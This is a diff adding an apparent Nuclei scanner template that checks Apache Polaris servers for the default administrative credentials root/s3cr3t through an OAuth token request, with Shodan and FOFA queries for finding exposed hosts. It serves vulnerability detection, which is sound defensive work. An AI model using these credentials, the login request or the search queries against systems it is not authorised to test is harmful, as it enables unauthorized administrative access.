@@ -1,0 +1,50 @@
+http:
+- attack: pitchfork
+  extractors:
+  - json:
+    - .access_token
+    name: accessToken
+    type: json
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains_all(body, "access_token", "token_type", "issued_token_type", "expires_in")
+    type: dsl
+  payloads:
+    password:
+    - s3cr3t
+    username:
+    - root
+  raw:
+  - 'POST /api/catalog/v1/oauth/tokens HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    grant_type=client_credentials&client_id={{username}}&client_secret={{password}}&scope=PRINCIPAL_ROLE:ALL
+
+    '
+id: apache-polaris-default-login
+info:
+  author: icarot
+  classification:
+    cpe: cpe:2.3:a:apache:polaris:*:*:*:*:*:*:*:*
+  description: 'The Apache Polaris server is configured with default administrative
+    credentials, allowing an attacker to perform unauthorized operations. This template
+    verifies the use of the default username root and password s3cr3t.
+
+    '
+  metadata:
+    fofa-query: title="Apache Polaris"
+    max-request: 1
+    product: polaris
+    shodan-query: http.title:"Apache Polaris"
+    vendor: apache
+  name: Apache Polaris - Default Login
+  reference:
+  - https://github.com/apache/polaris
+  severity: high
+  tags: apache,polaris,default-login,vuln
